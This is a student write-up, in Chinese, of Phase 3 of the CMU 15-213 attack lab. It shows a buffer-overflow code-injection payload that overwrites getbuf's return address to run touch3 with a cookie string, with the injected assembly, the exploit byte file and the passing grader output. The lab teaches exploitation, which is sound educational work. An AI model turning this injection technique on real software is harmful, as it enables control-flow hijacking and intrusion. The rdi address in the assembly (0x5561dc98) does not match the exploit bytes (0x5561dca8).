# Phase3

- 目标：通过 getbuf 的漏洞，输入一段字节，执行 touch3，并将 cookie 的内容以字符串的形式作为第一个参数传递
  ```c
  void touch3(char *sval);
  ```
- 攻击手段：使用 code injection 方式进行攻击，传递一个字符串作为参数。


难点在于 touch3 调用了一个 hexmatch 方法，并且 hexmatch 会覆盖 getbuf 之前的栈位置的内容。
所以我们不能向之前那样，简单的把输入的内容放在 getbuf 栈位置，需要找一个 hex2match 操作不到的地方。


由于栈低地址方向生长，我们把需要注入的内容放在 getbuf 栈的高地址方向，就不用担心被覆盖了。

```c
// call stack
test  -> getbuf // ret
      -> touch3 -> hex2match
```

> 当 getbuf ret 时，其申请的栈就被释放了。当进入 touch3 函数时，会重新申请栈空间（如果有必要），调用 hex2match 会继续申请。
> 我们看到，touch3 和 hex2match 的栈地址和之前 getbuf 的可能存在重叠。



## 解题过程

这里和之前一样，需要写入注入代码，大体步骤如下

1. 覆盖 getbuf ret 原来返回的指令地址地方为我们注入的代码
2. 注入代码完成以下功能
   1. 将 touch3 函数地址压栈 `disas touch3` 可查
   2. 将 cookie 的 value 以 ascii 形式写入到一个特定的地址 addr，并且把这个 addr 传入 rdi
   ```s
   pushq $0x4018fa # push touch3 funciton addr
   mov $0x5561dc98, %rdi # 0x5561dca0 - 8
   ret
   ```
3. cookie 内容转 ascii，可通过 man ascii 看完整的 ascii 表。就是输入 char 类型的 `5` `9` `b` `9` `9` `7` `f` `a`
   ```
   # 0x59b997fa
   ```


exploit3.txt

```
68 fa 18 40 00 48 c7 c7 /* <== <ADDR 0x5561dc78> */
a8 dc 61 55 c3 ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff /* padding 0x28 (40) bytes */
78 dc 61 55 00 00 00 00 /* <== <ADDR 0x5561dca0> getbuf 执行 ret 时，从这个地址取指令，即：我们注入的代码地址 */
35 39 62 39 39 37 66 61 /* <== <ADDR 0x5561dca8> 显示 cookie对应的 ascii 0x 5 9 b 9 9 7 f a */
```


## 验证

```shell
cat ./exploit3.txt | ./hex2raw | ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```
